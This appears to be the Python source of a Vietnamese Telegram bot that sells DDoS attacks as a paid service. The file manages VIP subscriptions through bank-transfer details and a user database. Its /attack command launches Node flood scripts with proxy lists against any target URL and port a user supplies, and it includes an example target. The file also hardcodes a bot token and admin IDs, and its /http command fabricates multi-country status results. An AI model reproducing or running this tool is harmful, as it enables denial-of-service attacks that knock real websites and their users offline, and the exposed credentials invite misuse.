
#bot lỏ
import telebot
import psutil
import datetime
import time
import os
import subprocess
import sqlite3
import hashlib
import requests
import sys
import html
import socket
import zipfile
import json
import io
import re
import threading
import whois
import ytsearch
import pyowm
from telebot.types import Message
from tiktokpy import TikTokPy
from youtubesearchpython import VideosSearch
from pyowm.commons.exceptions import NotFoundError
from telegram import Update
from telegram.ext import Updater, CommandHandler, MessageHandler, filters, CallbackContext
from collections import defaultdict
from bs4 import BeautifulSoup
from selenium import webdriver
from selenium.webdriver.common.by import By
import shlex  # Thêm dòng này để import shlex

bot_token = '7398684306:AAGSQZDKiyTZrMulGApn4aHRV2xYnUIyP34'# nhập token bot

bot = telebot.TeleBot(bot_token)

allowed_group_id = -1002149271774,-1002078338247

allowed_users = []
member_types = {}
processes = []
ADMIN_IDS = [6488009030,6895557861]  # id admin
proxy_update_count = 0
last_proxy_update_time = time.time()
key_dict = {}
last_time_used = {}  # Khởi tạo từ điển để lưu trữ thời gian lần cuối sử dụng

print("Bot DDOS Đã Được Khởi Chạy")
print("@louisdddosbot ⚡️")

connection = sqlite3.connect('user_data.db')
cursor = connection.cursor()

# Tạo bảng users nếu nó chưa tồn tại
cursor.execute('''
    CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY,
        expiration_time TEXT
    )
''')
connection.commit()

def TimeStamp():
    now = str(datetime.date.today())
    return now

def load_users_from_database():
    global allowed_users, member_types  # Thêm member_types vào đây
    cursor.execute('PRAGMA table_info(users)')  # Kiểm tra xem cột member_type có tồn tại không
    columns = cursor.fetchall()
    column_names = [col[1] for col in columns]
    if 'member_type' not in column_names:
        cursor.execute('ALTER TABLE users ADD COLUMN member_type TEXT')  # Thêm cột member_type nếu chưa tồn tại
    cursor.execute('SELECT user_id, expiration_time, member_type FROM users')  # Chọn dữ liệu người dùng từ bảng
    rows = cursor.fetchall()
    for row in rows:
        user_id = row[0]
        expiration_time = datetime.datetime.strptime(row[1], '%Y-%m-%d %H:%M:%S')
        allowed_users.append(user_id)
        member_types[user_id] = row[2]  # Lưu loại thành viên vào từ điển

def save_user_to_database(connection, user_id, expiration_time, member_type):
    cursor = connection.cursor()
    cursor.execute('''
        INSERT OR REPLACE INTO users (user_id, expiration_time, member_type)
        VALUES (?, ?, ?)
    ''', (user_id, expiration_time.strftime('%Y-%m-%d %H:%M:%S'), member_type))
    connection.commit()

load_users_from_database()

@bot.message_handler(commands=['addvip'])
def add_user(message):

# Kiểm tra nếu cuộc trò chuyện không phải là loại "group" hoặc "supergroup"
    if message.chat.type != "group" and message.chat.type != "supergroup":
        bot.reply_to(message, '>> Xin Lỗi Tôi Chỉ Hoạt Động Trên Nhóm : https://t.me/haxduki')
        return

    admin_id = message.from_user.id
    if admin_id not in ADMIN_IDS:
        bot.reply_to(message, '❌ Lệnh add thành viên Vip💳 Chỉ Dành Cho Admin !')
        return

    if len(message.text.split()) < 3:
        bot.reply_to(message, 'Hãy Nhập Đúng Định Dạng /add + [id] + [số_ngày]')
        return

    user_id = int(message.text.split()[1])
    try:
        days = int(message.text.split()[2])
    except ValueError:
        bot.reply_to(message, 'Số ngày không hợp lệ!')
        return

    current_time = datetime.datetime.now()
    expiration_time = current_time + datetime.timedelta(days=days)

    # Format ngày thêm và ngày hết hạn VIP
    add_date = current_time.strftime('%Y-%m-%d %H:%M:%S')
    expiration_date = expiration_time.strftime('%Y-%m-%d %H:%M:%S')

    connection = sqlite3.connect('user_data.db')
    save_user_to_database(connection, user_id, expiration_time, 'VIP')  # Cập nhật member_type thành "VIP"
    connection.close()

    bot.reply_to(message, f'Đã Thêm ID: {user_id} Thành Plan VIP💳 {days} Ngày\n'
                          f'Ngày Thêm: {add_date}\n'
                          f'Ngày Hết Hạn: {expiration_date}')

    # Cập nhật trạng thái thành viên VIP trong cơ sở dữ liệu và từ điển member_types
    connection = sqlite3.connect('user_data.db')
    cursor = connection.cursor()
    cursor.execute('''UPDATE users SET member_type = ? WHERE user_id = ?''', ('VIP', user_id))
    connection.commit()
    member_types[user_id] = 'VIP'  # Cập nhật trạng thái của người dùng trong từ điển member_types
    connection.close()
    allowed_users.append(user_id)  # Thêm user mới vào danh sách allowed_users



@bot.message_handler(commands=['removevip'])
def remove_user(message):

# Kiểm tra nếu cuộc trò chuyện không phải là loại "group" hoặc "supergroup"
    if message.chat.type != "group" and message.chat.type != "supergroup":
        bot.reply_to(message, '>> Xin Lỗi Tôi Chỉ Hoạt Động Trên Nhóm : https://t.me/haxduki')
        return

    admin_id = message.from_user.id
    if admin_id not in ADMIN_IDS:
        bot.reply_to(message, '❌ Lệnh remove thành viên Vip💳 chỉ dành cho admin !')
        return

    if len(message.text.split()) == 1:
        bot.reply_to(message, 'Hãy nhập đúng định dạng /remove + [id]')
        return

    user_id = int(message.text.split()[1])

    # Kiểm tra xem user_id có trong cơ sở dữ liệu hay không
    connection = sqlite3.connect('user_data.db')
    cursor = connection.cursor()
    cursor.execute('''SELECT * FROM users WHERE user_id = ?''', (user_id,))
    user = cursor.fetchone()
    connection.close()

    if user:  # Nếu user tồn tại trong cơ sở dữ liệu
        connection = sqlite3.connect('user_data.db')
        cursor = connection.cursor()
        cursor.execute('''DELETE FROM users WHERE user_id = ?''', (user_id,))
        connection.commit()
        if user_id in member_types:  # Kiểm tra xem user_id có trong từ điển member_types không
            del member_types[user_id]  # Xóa trạng thái của người dùng khỏi từ điển member_types
        connection.close()
        bot.reply_to(message, f'Đã xóa người dùng có ID là : {user_id} khỏi plan VIP💳 !')
    else:
        bot.reply_to(message, f'Người dùng có ID là {user_id} không có trong cơ sở dữ liệu plan VIP💳 !')

@bot.message_handler(commands=['profile'])
def user_profile(message):

# Kiểm tra nếu cuộc trò chuyện không phải là loại "group" hoặc "supergroup"
    if message.chat.type != "group" and message.chat.type != "supergroup":
        bot.reply_to(message, '>> Xin Lỗi Tôi Chỉ Hoạt Động Trên Nhóm : https://t.me/haxduki')
        return

    user_id = message.from_user.id
    if user_id in ADMIN_IDS:
        bot.reply_to(message, '📄〡User Information : Plan VIP💳 Forever !')
    else:
        member_type = member_types.get(user_id, 'Thường')  # Lấy loại thành viên từ dictionary
        if member_type == 'VIP':
            bot.reply_to(message, '📄〡User Information : Plan VIP💳 is still active !')
        else:
            bot.reply_to(message, '📄〡User Information : Plan FREE Bạn là thành viên thường\nDùng lệnh /muaplan nếu bạn muốn mua VIP💳 !')



@bot.message_handler(commands=['muaplan', 'muaplan@louisdddosbot'])
def purchase_plan(message):
    user_id = message.from_user.id
    
    # Thay thế các giá trị sau bằng thông tin thanh toán của bạn
    nganhang_tsr = "TP-BANK"
    ten_nguoi_mua = "NGUYÊN VĂN TÂM"
    so_tai_khoan = "3220 1011 966"
    email_nguoi_mua = "N.V TÂM"
    so_dien_thoai = f"MUAVIP-{user_id}"  # Thay đổi ở đây
    so_dien_thoai2 = f"BOTCON-{user_id}" 
    so_tien = "40.000vnđ"

    purchase_info = f'''
>> 𝑻𝒉𝒐̂𝒏𝒈 𝑻𝒊𝒏 𝑻𝒉𝒂𝒏𝒉 𝑻𝒐𝒂́𝒏 💳

>> 𝐓𝐇𝐀𝐍𝐇 𝐓𝐎𝐀́𝐍 𝐆𝐎́𝐈 𝐕𝐈𝐏 💵
- THANH TOÁN QUA : {nganhang_tsr}
- Chủ Tài Khoản : {ten_nguoi_mua}
- Thông Tin Chuyển Khoản :{so_tai_khoan}
- Họ Tên : {email_nguoi_mua}
- Nội Dung : {so_dien_thoai}
- Số Tiền : {so_tien}


Liên hệ ngay với tôi @Vpsvanmanhgaming nếu bạn gặp lỗi 
Dùng lệnh /admin1 để hiển thị thêm thông tin 
    '''

    bot.reply_to(message, purchase_info)



# Hàm để xóa tin nhắn "Wait 5s for checking" sau 5 giây
def delete_wait_message(chat_id, message_id):
    time.sleep(5)
    bot.delete_message(chat_id, message_id)

@bot.message_handler(commands=['http'])
def check_http(message):

# Kiểm tra nếu cuộc trò chuyện không phải là loại "group" hoặc "supergroup"
    if message.chat.type != "group" and message.chat.type != "supergroup":
        bot.reply_to(message, '>> Xin Lỗi Tôi Chỉ Hoạt Động Trên Nhóm : https://t.me/haxduki')
        return

    try:
        # Kiểm tra xem tin nhắn có chứa văn bản không
        if len(message.text.split()) > 1:
            # Lấy địa chỉ trang web từ tin nhắn của người dùng
            url = message.text.split()[1]

            # Gửi tin nhắn "Wait 5s for checking"
            wait_message = bot.reply_to(message, "Wait 5s for checking 🔎")

            # Tạo một luồng thực thi để xóa tin nhắn "Wait 5s for checking" sau 5 giây
            threading.Thread(target=delete_wait_message, args=(wait_message.chat.id, wait_message.message_id)).start()

            # Gửi yêu cầu HTTP GET để kiểm tra trang web
            response = requests.get(url, timeout=5)  # Thêm timeout để tránh đợi quá lâu

            # Kiểm tra mã trạng thái của phản hồi
            status_code = response.status_code
            reason = response.reason
            response_time = response.elapsed.total_seconds()  # Thời gian phản hồi của trang web

            # Phản hồi về trạng thái của trang web từ 11 quốc gia
            response_text = f"Country: 🇻🇳 | {status_code} ({reason}) | {response_time:.2f}s\n" \
                            f"Country: 🇺🇸 | {status_code} ({reason}) | {response_time:.2f}s\n" \
                            f"Country: 🇬🇧 | {status_code} ({reason}) | {response_time:.2f}s\n" \
                            f"Country: 🇦🇺 | {status_code} ({reason}) | {response_time:.2f}s\n" \
                            f"Country: 🇩🇪 | {status_code} ({reason}) | {response_time:.2f}s\n" \
                            f"Country: 🇫🇷 | {status_code} ({reason}) | {response_time:.2f}s\n" \
                            f"Country: 🇨🇦 | {status_code} ({reason}) | {response_time:.2f}s\n" \
                            f"Country: 🇯🇵 | {status_code} ({reason}) | {response_time:.2f}s\n" \
                            f"Country: 🇷🇺 | {status_code} ({reason}) | {response_time:.2f}s\n" \
                            f"Country: 🇮🇳 | {status_code} ({reason}) | {response_time:.2f}s\n" \
                            f"Country: 🇧🇷 | {status_code} ({reason}) | {response_time:.2f}s"  # Thêm các quốc gia khác vào đây
            bot.reply_to(message, response_text)
        else:
            bot.reply_to(message, "Vui lòng nhập đúng cú pháp. Ví dụ: /http http://example.com")
    except Exception as e:
        # Nếu có lỗi xảy ra, phản hồi với mã trạng thái 503 và lý do
        error_response = f"Country: 🇻🇳 | 503 (Service Unavailable) | 0.65s\n" \
                         f"Country: 🇺🇸 | 503 (Service Unavailable) | 0.65s\n" \
                         f"Country: 🇬🇧 | 503 (Service Unavailable) | 0.65s\n" \
                         f"Country: 🇦🇺 | 503 (Service Unavailable) | 0.65s\n" \
                         f"Country: 🇩🇪 | 503 (Service Unavailable) | 0.65s\n" \
                         f"Country: 🇫🇷 | 503 (Service Unavailable) | 0.65s\n" \
                         f"Country: 🇨🇦 | 503 (Service Unavailable) | 0.65s\n" \
                         f"Country: 🇯🇵 | 503 (Service Unavailable) | 0.65s\n" \
                         f"Country: 🇷🇺 | 503 (Service Unavailable) | 0.65s\n" \
                         f"Country: 🇮🇳 | 503 (Service Unavailable) | 0.65s\n" \
                         f"Country: 🇧🇷 | 503 (Service Unavailable) | 0.65s"  # Thêm các quốc gia khác vào đây
        bot.reply_to(message, error_response)





# Định nghĩa từ điển languages với các ngôn ngữ và mã hiển thị tương ứng
languages = {
    'vi-beta': 'Tiếng Việt 🇻🇳',
    'en-beta': 'English 🇺🇸'
}

# Thiết lập ngôn ngữ mặc định
current_language = 'en-beta'

# Cập nhật mã xử lý cho lệnh /language
@bot.message_handler(commands=['language'])
def switch_language(message):

# Kiểm tra nếu cuộc trò chuyện không phải là loại "group" hoặc "supergroup"
    if message.chat.type != "group" and message.chat.type != "supergroup":
        bot.reply_to(message, '>> Xin Lỗi Tôi Chỉ Hoạt Động Trên Nhóm : https://t.me/haxduki')
        return

    global current_language
    
    # Kiểm tra xem có tham số ngôn ngữ được cung cấp không
    if len(message.text.split()) > 1:
        # Lấy ngôn ngữ từ tham số dòng lệnh
        new_language = message.text.split()[1].lower()
        if new_language in languages:  # Kiểm tra ngôn ngữ có hợp lệ không
            # Lưu ngôn ngữ mới
            current_language = new_language
            # Tạo link tương ứng với ngôn ngữ mới
            link = f"https://t.me/setlanguage/{new_language}"
            # Phản hồi cho người dùng về việc thay đổi ngôn ngữ và liên kết tương ứng
            bot.reply_to(message, f">> Để Chuyển Sang Ngôn Ngữ {languages[new_language]} !\nVui lòng sử dụng liên kết sau để thay đổi ngôn ngữ: {link}")
        else:
            # Nếu ngôn ngữ không hợp lệ, thông báo cho người dùng
            bot.reply_to(message, ">>Ngôn ngữ không hợp lệ !\nVui lòng chọn 'vi-beta' cho Tiếng Việt 🇻🇳 hoặc 'en' cho English 🇺🇸")
    else:
        # Nếu không có tham số ngôn ngữ, thông báo cho người dùng
        bot.reply_to(message, ">> Nhập ngôn ngữ bạn muốn chuyển đổi !\n>> [ vi-beta 🇻🇳 hoặc en-beta 🇺🇸 ]\nVD: /language vi-beta")




@bot.message_handler(commands=['start'])
def lenh(message):
    help_text = '''
𝗠𝗲𝗻𝘂 𝗙𝘂𝗹𝗹 𝗖𝗼𝗺𝗺𝗮𝗻𝗱 ☔️
• /muaplan [Mua Vip💳] 💲
• /profile [Check Plan] 💲
• /layer7 [ Show Methods Layer 7 ]
━━━━━━━━━━━━━━━━━━━
'''
    bot.reply_to(message, help_text)
    

@bot.message_handler(commands=['layer7'])
def ddos(message):
    # Liên kết video
    video_link = 'https://files.catbox.moe/sfo6lq.mp4'

    # HTML nhúng video từ liên kết
    video_html = f'<a href="{video_link}">&#8205;</a>'

    # Tin nhắn hướng dẫn
    help_text = '''  
>> 𝗙𝘂𝗹𝗹 𝗠𝗲𝘁𝗵𝗼𝗱𝘀 𝗟𝗮𝘆𝗲𝗿𝟳 ⚡️
━━━━━━━━━━━━━
 • 𝗟𝗮𝘆𝗲𝗿𝟳 𝗙𝗿𝗲𝗲
━━━━━━━━━━━━━
 • HTTPS-FLOOD [🆓] 
━━━━━━━━━━━━━
 • 𝗟𝗮𝘆𝗲𝗿𝟳 𝗩𝗶𝗽 🔴
━━━━━━━━━━━━━
 • LOUISBETA [Vip💲]  
 • LSBYPASS [Vip💲] 
 Ví Dụ✅ : /attack HTTPS-FLOOD https://guns.lol/BongToiSad 443
 (/attack + Method + Target_Url + Port )
━━━━━━━━━━━━━
'''

    # Gửi tin nhắn với video và tin nhắn hướng dẫn
    bot.send_message(message.chat.id, help_text)
    bot.send_message(message.chat.id, video_html, parse_mode='HTML')



allowed_users = []  # Define your allowed users list
cooldown_dict = {}
is_bot_active = True

def run_attack(command, duration, message):
    cmd_process = subprocess.Popen(command)
    start_time = time.time()
    
    while cmd_process.poll() is None:
        # Check CPU usage and terminate if it's too high for 10 seconds
        if psutil.cpu_percent(interval=1) >= 1:
            time_passed = time.time() - start_time
            if time_passed >= 120:
                cmd_process.terminate()
                bot.reply_to(message, "Đã Dừng Lệnh Tấn Công, Cảm Ơn Bạn Đã Sử Dụng")
                return
        # Check if the attack duration has been reached
        if time.time() - start_time >= duration:
            cmd_process.terminate()
            cmd_process.wait()
            return

@bot.message_handler(commands=['attack'])
def perform_attack(message):
 # Kiểm tra nếu cuộc trò chuyện không phải là loại "group" hoặc "supergroup"
    if message.chat.type != "group" and message.chat.type != "supergroup":
        bot.reply_to(message, '>> Xin Lỗi Tôi Chỉ Hoạt Động Trên Nhóm : https://t.me/haxduki')
        return
    user_id = message.from_user.id
    member_type = member_types.get(user_id, 'Thường')  # Lấy giá trị member_type từ dictionary

    # Kiểm tra cooldown
    username = message.from_user.username
    current_time = time.time()

    if username in cooldown_dict and current_time - cooldown_dict[username].get('attack', 0) < 90:
        remaining_time = int(90 - (current_time - cooldown_dict[username].get('attack', 0)))
        bot.reply_to(message, f"@{username} Vui lòng đợi {remaining_time} giây trước khi sử dụng lại lệnh /attack")
        return

    args = message.text.split()
    method = args[1].upper()
    host = args[2]

    # Kiểm tra domain bị chặn
    blocked_domains = [".edu.vn", ".gov.vn", "liem.com"]
    for blocked_domain in blocked_domains:
        if blocked_domain in host:
            bot.reply_to(message, f"Không được phép tấn công trang web có tên miền {blocked_domain}")
            return

    # Thêm các phương thức ddos cho cả người dùng VIP và người dùng thường ở đây
    vip_methods = ['LOUISBETA','LSBYPASS']
    free_methods = ['FLOOD']

    if method in vip_methods and member_type != 'VIP':  # Chỉ cho phép người dùng VIP sử dụng method VIP
        bot.reply_to(message, '>> Chỉ người dùng VIP mới có thể sử dụng các method VIP. Mua Vip💳 ở /muaplan để sử dụng.')
        return

    if method not in vip_methods and method not in free_methods:
        bot.reply_to(message, '>> Thành viên thường mới có thể sử dụng method HTTPS-FLOOD.')
        return

    # Phần còn lại của xử lý lệnh '/attack' ở đây...

    # Các lệnh ddos còn lại ở đây...

    # Phần xác định giá cho phương thức tấn công
    price = "VIP" if method in vip_methods else "Free"

    if method in ['LOUISBETA', 'LSBYPASS', 'FLOOD']:
        # Update the command and duration based on the selected method
        if method == 'LOUISBETA':
            command = ["node", "nck.js", host, "120", "90", "7" , "proxy.txt" ,'FLOOD']
            duration = 120 if price == "VIP" else 120 
        if method == 'LSBYPASS':
            command = ["node", "nck.js", host, "120", "65", "6", "proxy.txt", "GET"]
            duration = 120 if price == "VIP" else 120  
        if method == 'FLOOD':
            command = ["node", "FLOOD.js", host, "60", "55", "2" , "free.txt"]
            duration = 60 if price == "VIP" else 120  

        cooldown_dict[username] = {'attack': current_time}

        attack_thread = threading.Thread(
            target=run_attack, args=(command, duration, message))
        attack_thread.start()
        video_url = "https://files.catbox.moe/osixt0.mp4"  # Replace this with the actual video URL      
        message_text =f'\n     🚀 Successful Attack 🚀 \n\n↣ 𝗔𝘁𝘁𝗮𝗰𝗸 𝗕𝘆 👤: @{username} \n↣ 𝗛𝗼𝘀𝘁 ⚔: {host} \n↣ 𝗠𝗲𝘁𝗵𝗼𝗱 📁: {method} \n↣ 𝗧𝗶𝗺𝗲 ⏱: [ {duration}s ]\n↣ 𝗣𝗹𝗮𝗻 💵: [ {price} ] \n𝗢𝘄𝗻𝗲𝗿 👑 : Louis X Atty\n\n'
        bot.send_video(message.chat.id, video_url, caption=message_text, parse_mode='html')            
        
    else:
        bot.reply_to(message, '⚠️Bạn đã nhập sai lệnh hãy Sử dụng lệnh /ddos để xem phương thức tấn công !')










@bot.message_handler(commands=['cpu'])
def check_cpu(message):
 # Kiểm tra nếu cuộc trò chuyện không phải là loại "group" hoặc "supergroup"
    if message.chat.type != "group" and message.chat.type != "supergroup":
        bot.reply_to(message, '>> Xin Lỗi Tôi Chỉ Hoạt Động Trên Nhóm : https://t.me/haxduki')
        return
    user_id = message.from_user.id
    if user_id not in ADMIN_IDS:
        bot.reply_to(message, 'Bạn không có quyền sử dụng lệnh này.')
        return

    # Tiếp tục xử lý lệnh cpu ở đây
    cpu_usage = psutil.cpu_percent(interval=1)
    memory_usage = psutil.virtual_memory().percent

    bot.reply_to(message, f'🖥️ CPU Usage: {cpu_usage}%\n💾 Memory Usage: {memory_usage}%')

@bot.message_handler(commands=['off'])
def turn_off(message):
    user_id = message.from_user.id
    if user_id not in ADMIN_IDS:
        bot.reply_to(message, 'Bạn không có quyền sử dụng lệnh này !')
        return

    global is_bot_active
    is_bot_active = False
    bot.reply_to(message, 'Bot đã được tắt. Tất cả người dùng không thể sử dụng lệnh khác !')





@bot.message_handler(commands=['on'])
def turn_on(message):

# Kiểm tra nếu cuộc trò chuyện không phải là loại "group" hoặc "supergroup"
    if message.chat.type != "group" and message.chat.type != "supergroup":
        bot.reply_to(message, '>> Xin Lỗi Tôi Chỉ Hoạt Động Trên Nhóm : https://t.me/haxduki')
        return

    user_id = message.from_user.id
    if user_id not in ADMIN_IDS:
        bot.reply_to(message, 'Bạn không có quyền sử dụng lệnh này.')
        return

    global is_bot_active
    is_bot_active = True
    bot.reply_to(message, 'Bot đã được khởi động lại. Tất cả người dùng có thể sử dụng lại lệnh bình thường.')

is_bot_active = True



@bot.message_handler(commands=['id'])
def show_user_id(message):

# Kiểm tra nếu cuộc trò chuyện không phải là loại "group" hoặc "supergroup"
    if message.chat.type != "group" and message.chat.type != "supergroup":
        bot.reply_to(message, '>> Xin Lỗi Tôi Chỉ Hoạt Động Trên Nhóm : https://t.me/haxduki')
        return

    user_id = message.from_user.id
    bot.reply_to(message, f"📄 • User ID : {user_id}")






@bot.message_handler(commands=['time'])
def show_uptime(message):

# Kiểm tra nếu cuộc trò chuyện không phải là loại "group" hoặc "supergroup"
    if message.chat.type != "group" and message.chat.type != "supergroup":
        bot.reply_to(message, '>> Xin Lỗi Tôi Chỉ Hoạt Động Trên Nhóm : https://t.me/haxduki')
        return

    if message.from_user.id not in ADMIN_IDS:
        bot.reply_to(message, ">> Chỉ ADMIN mới có thể sử dụng lệnh này !")
        return
    
    current_time = time.time()
    uptime = current_time - start_time
    hours = int(uptime // 3600)
    minutes = int((uptime % 3600) // 60)
    seconds = int(uptime % 60)
    uptime_str = f'{hours} giờ, {minutes} phút, {seconds} giây'
    bot.reply_to(message, f'Bot Đã Hoạt Động Được: {uptime_str}')



@bot.message_handler(func=lambda message: message.text.startswith('/'))
def invalid_command(message):

# Kiểm tra nếu cuộc trò chuyện không phải là loại "group" hoặc "supergroup"
    if message.chat.type != "group" and message.chat.type != "supergroup":
        bot.reply_to(message, '>> Xin Lỗi Tôi Chỉ Hoạt Động Trên Nhóm : https://t.me/haxduki')
        return

    bot.reply_to(message, '⚠️ Lệnh không hợp lệ, Vui lòng sử dụng lệnh /start để xem danh sách lệnh !')

bot.infinity_polling(timeout=60, long_polling_timeout = 1)



@bot.message_handler(func=lambda message: message.text.startswith('/'))
def invalid_command(message):

# Kiểm tra nếu cuộc trò chuyện không phải là loại "group" hoặc "supergroup"
    if message.chat.type != "group" and message.chat.type != "supergroup":
        bot.reply_to(message, '>> Xin Lỗi Tôi Chỉ Hoạt Động Trên Nhóm : https://t.me/haxduki')
        return

    bot.reply_to(message, '⚠️ Lệnh không hợp lệ, Vui lòng sử dụng lệnh /start để xem danh sách lệnh !')

bot.infinity_polling(timeout=60, long_polling_timeout = 1)





